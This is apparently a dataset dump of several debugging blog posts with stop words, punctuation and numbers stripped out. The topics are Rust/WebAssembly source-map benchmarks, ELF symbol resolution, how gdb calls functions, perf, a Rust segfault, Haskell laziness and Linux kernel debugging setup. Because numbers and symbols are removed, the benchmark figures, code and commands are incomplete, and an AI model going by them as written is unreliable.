original javascript implementation sourcemap library source map created uglifyjs mapping string character long latest angularjs minifiedtounminified source map source map mapping string character long scalajs runtime scalatojavascript source map source map largest mapping string character long additionally augmented input set two artificially constructed source map angularjs source map inflated ten time original size result mapping string size scalajs source map inflated twice original size result mapping string size input source map collected iteration benchmark astute reader noticed extra character inflated source map size respectively separator character copy original mapping string gluing together create inflated version pay particular attention scalajs source map largest nonartificial source map tested additionally largest source map measurement combination browser library implementation data largest input twice inflated scalajs source map chrome javascript implementation unable take measurement combination none benchmark could complete without tab content process crashing webassembly implementation chrome would erroneously throw runtimeerror memory access bound using chrome debugger supposed outofbounds access happening instruction sequence exist wasm file browser webassembly implementation successfully ran benchmark input inclined believe bug chrome implementation benchmark lower value better setting breakpoint first time first benchmark simulates stepping debugger setting breakpoint line original source first time requires source map mapping string parsed parsed mapping sorted original source location binary search breakpoint line mapping query return every generated javascript location corresponds mapping original source line webassembly implementation outperforms javascript counterpart browser scalajs source map webassembly implementation take amount time javascript counterpart take chrome firefox safari webassembly implementation fastest safari taking average compared chrome firefox furthermore relative standard deviation webassembly implementation narrow javascript implementation particularly firefox scalajs source map javascript implementation chrome relative standard deviation firefox safari webassembly spread shrink chrome firefox safari pausing exception first time second benchmark exercise code path first time generated javascript location used look corresponding original source location happens stepping debugger pause uncaught exception originating within generated javascript code console message logged within generated javascript code stepping generated javascript code javascript source translate generated javascript location original source location mapping string must parsed parsed mapping must sorted generated javascript location binary search closest mapping finally closest mapping original source location returned webassembly implementation outperforms javascript implementation browser even larger lead time scalajs source map chrome webassembly implementation take amount time javascript implementation take firefox safari webassembly take time javascript take safari run webassembly fastest followed firefox chrome webassembly implementation also le noisy javascript implementation relative standard deviation fell chrome firefox safari scalajs source map input subsequent breakpoints pause exception third fourth benchmark observe time take set subsequent breakpoints first one pause subsequent uncaught exception translate subsequent logged message location historically operation never performance bottleneck expensive part initial mapping string parse construction queryable data structure sorted array nevertheless want make sure stay way want operation suddenly become costly benchmark measuring time take binary search closest mapping target location returning mapping colocation benchmark result seasoned salt benchmark result looking scalajs source map input plot see clear stratum formation layering happens benchmarked operation run little time resolution timer becomes visible see chrome expose timer resolution tenth millisecond firefox expose resolution millisecond safari expose millisecond resolution conclude based data subsequent query largely remain submillisecond operation javascript webassembly implementation subsequent query never performance bottleneck become bottleneck new webassembly implementation iterating mapping final two benchmark measure time take parse source map immediately iterate mapping iterate alreadyparsed source map mapping common operation performed build tool composing consuming source map also sometimes performed stepping debugger highlight user line within original source user set breakpoints make sense set breakpoint line translate location generated javascript benchmark one worried involves boundary crossing ffi call every mapping source map benchmark tested design minimized number ffi call turn worry unfounded webassembly implementation meet javascript implementation performance even source map already parsed surpasses javascript implementation performance parseanditerate iteratealreadyparsed benchmark webassembly take time javascript chrome firefox webassembly take time javascript safari webassembly implementation take amount time javascript implementation take safari run webassembly implementation quickest firefox chrome essentially tied second place safari deserves special acknowledgment javascript performance iteratealreadyparsed benchmark beyond outperforming browser javascript time safari run javascript faster browser run webassembly true trend earlier benchmark also see reduction relative standard deviation webassembly compared javascript implementation parsing iterating chrome relative standard deviation fell firefox safari iterating alreadyparsed source map mapping firefox relative standard deviation dropped safari chrome relative standard deviation grew making browser buck trend one benchmark code size one advantage target target generates leaner webassembly code target includes polyfills libc file system built top indexeddb among thing sourcemap library used consider code size javascript webassembly delivered client looking code size bundling javascript module together single j file look effect using wasmgc wasmsnip wasmopt shrink wasm file size using gzip compression ubiquitously supported web measurement javascript size reported always size minified javascript created google closure compiler simple optimization level used closure compiler uglifyjs support newer ecmascript form introduced example let arrow function used simple optimization level advanced optimization level destructive javascript authored closure compiler mind bar labeled javascript variation original purejavascript sourcemap library implementation bar labeled webassembly variation new sourcemap library implementation us webassembly parsing mapping string querying parsed mapping note webassembly implementation still us javascript functionality sourcemap library additional feature generating source map still implemented javascript webassembly implementation report size webassembly javascript smallest new webassembly implementation larger total code size old javascript implementation byte versus byte respectively however using tool shrinking wasm size brought size webassembly original size implementation similar amount javascript replaced javascript parsing querying code webassembly webassembly implementation contain le javascript two factor contributing lack javascript code size reduction first small amount new javascript introduced load wasm file interface webassembly second importantly javascript routine replaced previously shared part sourcemap library although routine longer shared still use portion library let u turn focus towards contributing size pregziped wasm file running wasmobjdump h give u size section code data section effectively account whole wasm file size code section contains encoded webassembly instruction make function body data section consists static data loaded webassembly module linear memory space using wasmobjdump manually inspect data section content show mostly consists string fragment used constructing diagnostic message rust code panic however targeting webassembly rust panic translate webassembly trap trap carry extra diagnostic information consider bug rustc string fragment even emitted unfortunately wasmgc currently remove unused data segment either stuck bloat meantime webassembly tooling still relatively immature expect toolchain improve respect time next postprocess wasmobjdump disassembly output compute size function body inside code section group size rust crate heaviest crate dlmalloc used alloc crate implement rust lowlevel allocation apis together dlmalloc alloc clock byte total function size sense relief code size allocator constant grow port javascript code rust sum code size crate authored vlq sourcemapmappings sourcemapmappingswasmapi byte total function size leaf byte space consumed crate speaks efficacy wasmgc wasmsnip wasmopt although crate like std much larger crate use tiny fraction apis pay use conclusion future work rewriting performancesensitive portion source map parsing querying rust webassembly success benchmark webassembly implementation take fraction time original javascript implementation take little time observe browser webassembly implementation faster javascript implementation furthermore webassembly implementation offer consistent reliable performance relative standard deviation iteration dropped significantly compared javascript implementation javascript implementation accumulated convoluted code name performance replaced idiomatic rust rust force u choose clearly expressing intent runtime performance said still work pressing next step investigating rust standard library sorting fast custom quicksort targeting webassembly sole unidiomatic bit rust code rewrite behavior surprising since quicksort implementation naive standard library quick sort pattern defeating opportunistically us insertion sort small mostlysorted range fact standard library sorting routine faster targeting native code speculate inlining heuristic changing across target comparator function inlined standard library sorting routine targeting webassembly requires investigation found size profiling webassembly difficult necessary get useful information presented meaningfully forced write homegrown script postprocess wasmobjdump script construct call graph let u query caller function helping u understand function emitted wasm file even expect pretty hacky expose information inlined function proper webassembly size profiler would helped would benefit anyone following track relatively large code size footprint allocator suggests writing adapting allocator focused tiny code size could provide considerable utility webassembly ecosystem least use case allocator performance concern make small handful dynamic allocation allocator would choose small code size performance heartbeat unused segment data section highlight need wasmgc another tool detect remove static data never referenced still javascript api improvement make library downstream user introduction webassembly current implementation requires introduction manually freeing parsed mapping user finished come naturally javascript programmer used relying garbage collector typically think lifetime particular object could introduce sourcemapconsumerwith function took raw unparsed source map async function function would construct sourcemapconsumer instance invoke async function call destroy sourcemapconsumer instance async function call completes like async raii javascript sourcemapconsumerwith async function rawsourcemap f const consumer await new sourcemapconsumer rawsourcemap try await f consumer finally consumerdestroy another alternative way make api easier work javascript programmer would give every sourcemapconsumer instance webassembly module sourcemapconsumer instance would sole gc edge webassembly module instance could let garbage collector manage sourcemapconsumer instance webassembly module instance module instance heap strategy would single static mut mapping mapping rust webassembly glue code mapping instance would implicit exported query function call box new mapping parsemappings function passing around mut mapping pointer care might able remove allocation rust library would shrink emitted webassembly half current size course depends creating multiple instance webassembly module relatively cheap operation requires investigation wasmbindgen project aim remove need write ffi glue code hand automates interfacing webassembly javascript using able remove handwritten unsafe pointer manipulation code involved exporting rust apis javascript project ported source map parsing querying rust webassembly half sourcemap library functionality half generating source map also performance sensitive would like rewrite core building encoding source map rust webassembly sometime future well expect see similar speed ups observed parsing source map pull request adding webassembly implementation mozillasourcemap library process merging pull request contains benchmarking code result reproduced continue improve finally like thank tom tromey hacking project also like thank aaron turon alex crichton benjamin bouvier jeena lee jim blandy lin clark luke wagner mike cooper till schneidereit reading early draft providing valuable feedback document benchmark sourcemap library better thanks transpiler must insist spidermonkey us selfhosted javascript implementation arrayprototypesort custom comparator function c implementation overhead call webassembly javascript mostly disappear firefox bug land call javascript webassembly similar overhead outofline call javascript function patch landed yet browser landed equivalent improvement yet either firefox chrome tested latest nightly build safari latest safari technology preview requires newer macos version el capitan laptop running
359,Lobsters,debugging,Debugging,Profiler adventures: resolving symbol addresses is hard!,https://jvns.ca/blog/2018/01/09/resolving-symbol-addresses/,profiler adventure resolving symbol address hard,gdb call function symbol get symbol table binary page read symtab read dynsym name value type question want answer address symbol mapped problem aslr address space layout randomization problem dynamically loaded library dlsym code musl read probably problem interesting gist wrote,day posted gdb call function post said using symbol table figure address function want call pretty straightforward unsurprisingly turn figuring address memory corresponding given symbol actually really straightforward actually something profiler think interesting thought write basically problem trying solve symbol like rubyapiversion want figure address symbol mapped target process memory get data like ruby process ruby version far run fixed issue trying binary loaded memory loaded random address read symbol table symbol want necessary main binary procpidexe sometimes dynamically linked library need look elf program header adjust address look symbol start background explain thing actually know gdb symbol binary function variable instance perl global variable called plbincompatoptions function called perlsvcatpvmg sometimes binary need look function another binary example binary dynamically linked library need look function name also sometimes debugging code want know function address corresponds symbol look function variable binary section called symbol table symbol table basically index binary sometimes missing stripped lot binary format post usual binary format linux elf get symbol table binary thing learned today least learned forgot possible section symbol live symtab dynsym dynsym dynamic symbol table according page dynsym smaller version symtab contains global symbol least way read symbol table binary linux use nm objdump readelf read symtab nm file objdump syms file readelf file read dynsym nm file objdump dynamicsyms file readelf file readelf case readelf show everything elf file favorite need guess information want print everything use grep example symbol usrbinperl see symbol name value type value basically offset codedata corresponding symbol binary except symbol value think something dynamic linking understand going get readelf usrbinperl num value size type ndx name func perlsvcatpvmg func perlsvcopypv object plbincompatoptions func perlppucfirst func perlgvamupdate question want answer address symbol mapped enough background suppose debugger want know address rubyapiversion symbol mapped let use readelf look relevant ruby binary readelf grep rubyapiversion object global default rubyapiversion neat offset rubyapiversion done right course problem aslr address space layout randomization first issue linux load binary memory like load address instead usually add random offset wikipedia article aslr explains address space layout randomization aslr memoryprotection process operating system os guard bufferoverflow attack randomizing location system executables loaded memory see happening practice started time every time process get mapped different place memory meeting good friend proc pidmaps file contains list memory map process memory map tell u every address range process virtual memory turn virtual memory contiguous instead process get bunch possiblydisjoint memory map file useful find address stack heap every dynamically loaded library anonymous memory map probably cat proc pgrep f map grep binruby rxp r p rwp cat proc pgrep f map grep binruby rxp r p rwp cat proc pgrep f map grep binruby rxp r p rwp okay last example see binary mapped combine knowledge rubyapiversion mean need look address find variable right yes case work case brings u problem problem dynamically loaded library next tried running system ruby usrbinruby binary basically symbol disaster particular rubyapiversion symbol tried print rubyapiversion variable gdb worked gdb finding symbol found answer help good friend procpidmaps turn usrbinruby dynamically load library called see memory map cat proc pgrep f usrbinruby map grep libruby rxp p r p rwp read readelf find address symbol readelf grep rubyapiversion object global default rubyapiversion case address symbol want start memory map plus nice still done least one mystery one figured today one shakiest understanding happened running system ruby ubuntu ruby usual code find libruby map get address get symbol offset add working confused asked julian knew weird stuff need worry back said well read code dlsym trying basically thing decided instead randomly guessing go read code dlsym man page dlsym say dlsym dlvsym obtain address symbol shared object executable perfect dlsym code musl read musl like glibc different maybe easier read understand well dlsym code say line return defdso base defsym stvalue sound like dso base look like base map addrmin addrmin ph pvaddr also stuff make sure addrmin aligned page size maybe pay attention code want something like mapbase ph pvaddr sym stvalue looked vaddr thing elf program header subtracted calculation voilà worked probably problem imagine discover even way calculating symbol address wrong interesting seemingly simple thing address symbol complicated would nice able call dlsym right calculation think symbol different process maybe wrong though would like wrong know easier way would much like know someone reddit linked interesting gist wrote seems also reimplement dlsym
360,Lobsters,debugging,Debugging,Abstractions (And 3 sad tales of the slow app),https://alonisser.github.io/abstractions-talk/#1,abstraction sad tale slow app,,
361,Lobsters,debugging,Debugging,How does gdb call functions?,https://jvns.ca/blog/2018/01/04/how-does-gdb-call-functions/,gdb call function,gdb work three thing gdb twitter evan klitzke example c code mean call c function gdb elf crate jump call c function gdb useful invalidop set arbitrary process namespace running nelhage work debugging native part debugging native part actually create stack frame stack pointer change instruction pointer aside breakpoints set http put trap instruction somewhere also gdb call function complicated,previous gdb post gdb work three thing gdb discovered week call c function gdb thought cool previously thought gdb mostly readonly debugging tool really surprised work often asked twitter even work got lot really useful answer favorite answer evan klitzke example c code showing way code work exciting believe stracing experiment example c code different gdb actually call function talk figured gdb post figured lot still know gdb call function likely thing wrong mean call c function gdb get work let talk quickly found surprising nonobvious running c program target program want run function need basically pause program already running code find address function want call using symbol table convince program target program jump address function return restore instruction pointer register using symbol table figure address function want call pretty straightforward sketchy working rust code using linux code us elf crate wanted find address foo function pid run elfsymbolvalue foo fn elfsymbolvalue filename str symbolname str result box std error error open elf file let file elf file openpath filename ok okor parse error loop section symbol find right one let section filesections section sym filegetsymbols ok okor parse error symname symbolname return ok symvalue noneokor symbol found totally work also need look memory map file add symbol offset start place file mapped finding memory map hard procpidmaps anyway say finding address function call seemed straightforward rest change instruction pointer restore register else seem obvious jump kind said already find address function want run jump address tried gdb jump foo program segfaulted make sense call c function gdb first let see possible wrote tiny c program sleep second called testc include unistdh int foo return int main sleep next compile run gcc test testc test finally let attach test program gdb sudo gdb p pgrep f test gdb p foo gdb quit ran p foo ran function fun useful possible us let treat gdb little bit like c repl fun imagine could useful development utility function display navigate complex data structure quickly debugging gdb thanks invalidop set arbitrary process namespace running featuring notsosurprising appearance colleague nelhage probably know work got variety useful answer twitter asked calling function gdb work lot like well get address function symbol table whole story one person pointed nice part series gdb work written debugging native part debugging native part part explains approximately calling function work could work figuring gdb actually trivial try best step outlined stop process create new stack frame far away actual stack save register set register argument want call function set stack pointer new stack frame put trap instruction somewhere memory set return address trap instruction set instruction pointer register address function want call start process going go gdb know thing learned various piece evening create stack frame going run c function likely need stack store variable definitely want clobber current stack concretely gdb call function setting instruction pointer letting go need set stack pointer something speculation twitter work think construct new stack frame call right top stack sitting certain could allocate pseudo stack temporarily change sp value location could try put breakpoint look sp register address see contiguous current program register experiment inside gdb ran gdb p rsp void gdb break foo breakpoint gdb p foo breakpoint foo gdb p rsp void seems line gdb construct new stack frame call right top stack sitting theory since stack pointer rsp go stack pointer grow downward stack pointer pointer interesting seems like gdb creates new stack frame right bit surprising change instruction pointer let see whether gdb change instruction pointer gdb p rip void gdb b foo breakpoint gdb p foo breakpoint foo gdb p rip void instruction pointer change address foo function stared strace output still understand change okay aside breakpoints set wrote break foo straced gdb running understood almost nothing found one thing make sense system call gdb us set breakpoint really simple replaces one instruction cc http tell mean mean send sigtrap program interrupted put instruction back way putting breakpoint function foo address ptracepokedata gdb change code running program change instruction ptrace ptracepeektext ptrace ptracepokedata start program running ptrace ptracecont get signal hit breakpoint ptrace ptracegetsiginfo null sisignosigtrap sicodesikernel sivalue change instruction back ptrace ptracepeektext ptrace ptracepokedata put trap instruction somewhere gdb run function also put trap instruction bunch place one per strace basically replacing one instruction cc ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepokedata well looked process memory map turn somewhere weird gdb putting trap instruction libc well let see function turn libcsiglongjmp function gdb putting trap longjmp longjmpchk dlmain dlcloseworker know maybe reason function foo return calling longjmp gdb get control back sure gdb call function complicated going stop know little seems like answer gdb call function definitely simple found interesting try figure little bit hopefully still lot unanswered question exactly gdb thing okay really need know detail work happy slightly improved understanding
364,Lobsters,debugging,Debugging,A perf cheat sheet,https://jvns.ca/blog/2017/12/27/a-perf-cheat-sheet/,perf cheat sheet,http brendangreggcomperfhtml perf cheat sheet pdf,right working finishing zine perf started back may struggling explain say perf concise way yesterday finally hit idea making cheat sheet reference cover basic perf command line argument going make centerfold zine lot basic well slightly advanced stuff example sudo perf top e rawsyscalls sysenter n comm count system call process show live update stdbuf ol perf top e net netdevxmit n comm string count sent network packet process print update every second realize could either thing example cheat sheet taken permission http brendangreggcomperfhtml fantastic perf reference many great example click make bigger also print version perf cheat sheet pdf
365,Lobsters,debugging,Debugging,Debugging a segfault in my Rust program,https://jvns.ca/blog/2017/12/23/segfault-debugging/,debugging segfault rust program,love bug segfaults happen mprotect system call segfaults happen rust rust segfault step figure segfault happening getstacktrace returned step run valgrind step identify deallocation exactly problem wrong step try switching allocator step segfault jemalloc system allocator step reproduce weird jemalloc problem minimal way step realize wrong fixed thing learned segfaulting feature better asantsan exist http githubcomjaparicrustsan leaking memory safe behavior considered undefined behavior considered unsafe nice explanation difference betwen undefined unsafe also twitter read doc around unsafe function really carefully jemalloc thing understand tweet cool,hello yesterday finished debugging segfault retrospect pretty easy thing fix learned thing fixing thought share think great example allison kaptur love bug principle relatively simple bug new class bug good learning opportunity segfaults happen really quickly segfault program try access area allowed happen happen reason tried dereference access null pointer address derefencing work outofbounds memory access like went past end array code somewhere else set guard page around memory program would segfault protect memory mprotect system call useful thing often better fail early access unitialized memory accidentally put something pointer supposed pointer like random byte tried dereference pointer tried write readonly part memory dealt segfaults much rough categorization possible reason really helpful probably reason know segfaults happen rust segfaults happen rust reason rust also offer compiletime guarantee program segfault far understand possible reason rust program segfault wrote unsafe code way violates rust memory safety guarantee rust compiler bug option obviously much likely course happening program unsafe code program done something wrong matter figuring done wrong exactly unsafe code segfault program grab stack trace ruby program second time got stack trace first always segfaulting looked like shell fish already knew terminated signal sigsegv segfault meant good fish process sudo sudo terminated signal sigsegv address boundary error going go step went debug segfault artifically cleaned bit readable actually debugging bit confusingchaotic mostly accurate step figure segfault happening started putting lot print statement figure segfault happening exactly turned happened function getstacktrace returned knew rust compiler insert code deallocate drop pointer need deallocated end function figured segfault happening deallocation somewhere spoiler true step run valgrind never run valgrind knew tool detecting memory problem like useafterfree using uninitialized memory decided run valgrind see would help output valgrind looked like kind big think interesting going include invalid read size arenarunsizeget arenarundalloc arenadalloclargelockedimpl jearenadalloclarge lt alloc heap heap alloc allocator alloc gt dealloc lt alloc rawvec rawvec lt c gt gt deallocbuffer lt alloc rawvec rawvec lt c gt core ops drop drop gt drop core ptr dropinplace homeborkworkrubystacktracetargetdebugrubystacktrace core ptr dropinplace homeborkworkrubystacktracetargetdebugrubystacktrace rubystacktrace stacktrace getstacktrace rubystacktrace main rustmaybecatchpanic unknowninlinedfun catchunwind closure std rt langstart main homeborkworkrubystacktracetargetdebugrubystacktrace address stack malloc recently free invalid write size arenarunheapremove arenaruncoalesce arenarundalloc arenadalloclargelockedimpl jearenadalloclarge lt alloc heap heap alloc allocator alloc gt dealloc lt alloc rawvec rawvec lt c gt gt deallocbuffer lt alloc rawvec rawvec lt c gt core ops drop drop gt drop core ptr dropinplace homeborkworkrubystacktracetargetdebugrubystacktrace core ptr dropinplace homeborkworkrubystacktracetargetdebugrubystacktrace rubystacktrace stacktrace getstacktrace rubystacktrace main rustmaybecatchpanic unknowninlinedfun catchunwind closure std rt langstart main homeborkworkrubystacktracetargetdebugrubystacktrace address stack malloc recently free error invalid read invalid write complained address address address knew invalid address idea coming valgrind pretty useful though confirm segfault definitely happening deallocation see dropinplace drop deallocbuffer stack trace something definitely going wrong deallocating memory step identify deallocation exactly problem cool thing rust run std mem forget somevariable tell rust basically leak memory deallocate variable called cfps suspected problem sure enough added std mem forget cfps segfault stopped happening nice still know done wrong yet knew variable problem step try switching allocator noticed segfault happening inside jemalloc somewhere someone internet somewhere said valgrind work well jemalloc know actually true thought try switching allocator see valgrind would give le confusing result switch system allocator cfgattr rustcnightly feature test feature allocsystem feature allocsystem feature globalallocator allocatorapi extern crate allocsystem use allocsystem system globalallocator static system system switched system allocator surprising thing happened program segfault anymore step segfault jemalloc system allocator step constructive step instead lot confusion know could happen idea next step tweeted aaa program segfaults compile jemalloc switch system allocator try debug work fine like went sleep step reproduce weird jemalloc problem minimal way confused point decided well maybe ask someone help order ask someone help needed take chaotic mess program show someone simple program problem segfaults jemalloc system malloc managed reproduce issue rust playground really simple way basically program try cast vec vec element element struct nice felt really happy taken weird confusing behavior understand gotten happen small selfcontained program le line step realize wrong started writing question rust forum ask help figuring wrong often happens try explain going writing halfway writing question figured offending code basically take vector byte unsafely change vector structs make vector byte let mut ret vec vec withcapacity retpush let p retasmutptr make vector structs instead let rebuilt vec unsafe mem forget ret vec fromrawparts p mut turn thing wrong code third argument fromrawparts length number byte went read vec fromrawparts doc time finally read ptr need size alignment allocated definitely size byte good fixed basically instead trying cast memory creating new vec created slice instead let mut cfps vec getcfps thread sourcepid let slice rbcontrolframestruct unsafe std slice fromrawparts cfpsasmutptr mut rbcontrolframestruct cfpscapacity usize mem sizeof rbcontrolframestruct usize mem forget vec anymore let create slice view iterate slice let rust deallocate vec end function program segfault reason work safe vec always backed contiguous memory worried literally first sentence rust documentation vecs say contiguous growable array type written vec pronounced vector since vec contiguous memory cast slice iterate slice safely think thing learned segfaulting feature complained code segfaulted jemalloc libc malloc someone made comment like yeah jemalloc detects thing valgrind way program segfaulted better program picking subtle problem could bite later fix think reason people like use mprotect asantsan exist thing clang called threadsanitizeraddresssanitizer tsan asan sorta thing valgrind way le overhead get work time around documentation use rust http githubcomjaparicrustsan seems really cool leaking memory safe kind surprised learn leaking memory safe rust purpose mem forget think usually safe rust code leak strict guarantee rust also guarantee code segfault write safe code install guard page stack safely terminate program segfault stack overflow best reference official rust documentation behavior considered undefined behavior considered unsafe originally read doc thought undefined behavior unsafe synonym turn undefined behavior unsafe closely related thing manish goregaokar wrote nice explanation difference betwen undefined unsafe response post also twitter bit confusing safe rust program usually memory leak segfault part rust memory safety seems also strict guarantee segfaultsmemory leak happen learn read doc around unsafe function really carefully using unsafe function safe need careful make sure call function way maintains invariant rust expects rust really clear documentation expectation unsafe function try careful actually reading future jemalloc thing understand one jemalloc devs gave interesting answer code segfault jemalloc libc malloc tweet jemalloc cache memory threadlocally bucketed size reserved touch central allocator often risking lock contention dodge metadata lookup user tell u size memory freed think nbyte allocation really n byte return mbyte request stomping someone else data byte mn n think happening set capacity new vector incorrectly instead jemalloc took wrong hint big allocation freed caused segfault somehow cool fun bug know thing memory safety ran yay one favourite thing learning rust run bug rust program often learn new cool thing system valgrind asantsan jemalloc guard page
366,Lobsters,debugging,Debugging,Haskell Performance Debugging,http://www.parsonsmatt.org/2017/12/18/haskell_performance_debugging.html,haskell performance debugging,haskell performance debugging treap implementation reddit base run experiment one strictifying data structure strictifying split never ever use always use final run conclusion strict spine lazy leaf never use foldl,haskell performance debugging dec someone posted treap implementation reddit slow let analyze determine repo available base run set code cabal project created makefile ran initial profiling run code profiling output base branch github look executing code profilign output let check definition data structure question data node v node val v info prior int deriving eq show data treap v leaf tree node node v left treap v right treap v deriving show binary tree along annotation spine value lazy like linked list main function going inspecting output main g getstdgen let null repeat n rxs take n randomrs g int nodelist feedfold zip rxs null g buildnode treap insertmany empty nodelist print heighttreap treap print map node val v v inorder treap build executable profiling run p get time allocation profile output byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed time spent gc great profiling output indicates spending vast majority time splittreap function let look see splittreap ord v treap v v treap v treap v splittreap leaf leaf leaf splittreap tree tree node node val x left l right r v x v let lt rt splittreap r v tree node node tree left l right lt rt v x let lt rt splittreap l v lt tree node node tree left rt right r see two thing concerning tuples source often unwanted laziness space leak ghc sometimes see tuple data structure unbox entirely making overhead however sometimes bunch allocation thunk happening recursion totally defeat ghc ability inline thing wreck performance stuff like map foldr etc clever mean optimized naive recursive function often issue inlining impression get started experimenting order test tuple allocation hypothesis going run heap profiling run use hd flag get data constructor allocated neat okay graph tell u allocate ton node tuples constructor int start allocating bunch tree constructor given main function dealing entirely unreasonable experiment one strictifying data structure code section strictifytreap modify data structure placing bang pattern certain point data node v node val v info prior int deriving eq show data treap v leaf tree node node v left treap v right treap v deriving show make node type strict val prior field treap type strict node field info field left lazy like container leaving spine data structure lazy well output byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed using le memory good using le time overall v second also good actually gc worse output heap profile made huge difference certainly bit better time allocation profile tell another story gone second run program second feeling pretty encouraged going make tree spinestrict well data node v node val v info prior int deriving eq show data treap v leaf tree node node v left treap v right treap v deriving show still around total memory use according output byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed much better gc great much better second second substantial improvement let look heap output lot closer note generate big spike memory collect pretty telltale sign something got lot allocation tuple constructor bother strictifying split still largest offendor splittreap responsible nearly half runtime program know allocating throwing away tuples likely got space leak going add bang pattern inside tuples observe output change splittreap ord v treap v v treap v treap v splittreap leaf leaf leaf splittreap tree tree node node val x left l right r v x v let lt rt splittreap r v tree node node tree left l right lt rt v x let lt rt splittreap l v lt tree node node tree left rt right r original code destructures tuple immediately leaf lt rt variable lazy force variable weak head normal form new output byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed barely changed previous run heap profile change either going run hc see tuples getting allocated hc record function actually producing data tell u focus effort ah nut splittreap allocating tiny amount memory look like allocating buildnode feedfold insertmany seems disagree p output indicates spending majority time allocation splittreap well guess focus insertmany insertmany code section insertmany github mergetreap curried reason mergetreap treap v treap v treap v bother uncurrying anything point actually look insertmany insertmany ord v treap v node v treap v insertmany foldl inserttreap oh duh foldl strike insertmany ord v treap v node v treap v insertmany foldl inserttreap would win ghc amazing optimization power one prime boi output byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed nice total memory use tenth second le time overall also spending time garbage collection huge win let check heap profile never ever use foldl always use foldl go back beginning foldl foldl change run git checkout base get back original timeline change foldl foldl byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed rp time elapsed prof time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed great actually little worse started heap profile profile also nearly allocation appear little smoother significantly different switching foldl without also making data structure strict help final run finally disable profiling run code byte allocated heap byte copied gc byte maximum residency sample byte maximum slop mb total memory use mb lost due fragmentation tot time elapsed avg pause max pause gen colls par gen colls par init time elapsed mut time elapsed gc time elapsed exit time elapsed total time elapsed gc time elapsed alloc rate byte per mut second productivity total user total elapsed get total memory usage second execution time conclusion strict spine lazy leaf data structure strict spine lazy leaf unless explicitly intend constructingconsuming data constructor streaming fashion never use foldl seriously make hlint rule never use ban codebase make ghc proposal repeal replace prelude
367,Lobsters,debugging,Debugging,Kernel debugging for newbies,http://www.alexlambert.com/2017/12/18/kernel-debugging-for-newbies.html,kernel debugging newbie,widelyavailable wrapper osspecific apis bsd routing interface detailed error single generic value kernel source prepare window subsystem linux ubuntu emulates almost debuggee free nifty gdbcompatible debugger interface futzing serial port ubuntu get symbol debug symbol ubuntu wiki visualkernel get kernel source code enable source repository software source configuration script loop unrolling possible build gdb script build install kernel configuration setting ubuntu wiki instruction disable kaslr debuggee machine kernel address space layout randomization kaslr grub enable vmware debug stub set environment debugger machine security feature connect gdb debuggee,week working application set ipsec connection standard interface configuring ipsec widelyavailable even system advanced ipsec stack like xfrm linux provide wrapper want application work o x linux targeting instead osspecific apis unfortunately difficult use socketbased protocol application kernel like bsd routing interface application developer responsible detail like socket management serialization padding ipsec management interface provide detailed error encounter problem report single generic errno value like einval result difficult get detail right kernel consistently rejecting request invalid figure read kernel source figure requirement failed wanted step kernelside execution debugger thought would straightforward much harder anticipated took two full day stumbling blog post figure writing experience hope help others avoid pain prepare debug kernel need two machine debugger machine host debugging tool use gdb debugging tool kernel gdbspecific script make u productive case debugger machine run window use window subsystem linux run ubuntu window environment wsl phenomenal emulates enough linux abi run almost linux kernel problem debuggee machine run kernel debugged used virtual machine running inside vmware workstation player debugger machine player free nifty gdbcompatible debugger interface let avoid futzing serial port run ubuntu kernel vm kernel version differ substitute version uname r instruction tutorial assumes machine running ubuntu debuggee vmware vm start need prepare debugging environment build environment debuggee machine transfer debugger machine way match two configuration perfectly example using older version ubuntu debugger machine get symbol first get debug symbol current kernel debug symbol annotation compiled artifact contain information like variable name function name source code location path line number usually omitted release binary save space critical productive debugging enable match behavior relevant source code ubuntu debug symbol published separate archive different signing key install package described ubuntu wiki visualkernel trust debug symbol signing key debuggee sudo aptkey adv keyserver keyserverubuntucom recvkeys add debug symbol repository debuggee codename lsbrelease c awk print debuggee sudo tee etcaptsourceslistdddebslist eof deb http ddebsubuntucom codename main restricted universe multiverse deb http ddebsubuntucom codename security main restricted universe multiverse deb http ddebsubuntucom codename update main restricted universe multiverse deb http ddebsubuntucom codename proposed main restricted universe multiverse eof retrieve list available debug symbol package debuggee sudo apt update install debug symbol current kernel version debuggee sudo apt install yes linuximage uname r dbgsym get kernel source code next need kernel source code source code debug symbol loaded debugger show exact line source code executed enable source repository software source configuration straightforward script unfortunately download source kernelsource debuggee sudo apt update debuggee mkdir p kernelsource debuggee cd kernelsource debuggee apt source dpkgquery showformat source package source version show linuximage uname r debuggee cd linux kernel source modern compiler optimize code loop unrolling one optimization compiler prove loop execute exactly n time replace loop n copy body transformation preserve visible effect loop improving performance however optimization cause source code diverge executable code make debugging difficult therefore prefer debug using artifact built compiler optimization disabled using option gcc example unfortunately possible linux kernel attempt recompile kernel without optimization build gdb script kernel includes set gdb script make debugging kernel much easier example kernel functionality including often contained loadable module module loaded functionality needed loaded unloaded runtime difficult configure debugging fortunately gdb script included kernel automatically configure module debugging pain script small dependency 